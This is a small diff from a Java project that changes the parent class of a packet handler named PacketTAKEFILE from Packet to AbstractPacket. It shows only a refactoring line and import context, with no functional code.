@@ -7,7 +7,7 @@ import com.redpois0n.Main;
 import com.redpois0n.common.io.FileIO;
 
 
-public class PacketTAKEFILE extends Packet {
+public class PacketTAKEFILE extends AbstractPacket {
 
 	@Override
 	public void read(String line) throws Exception {
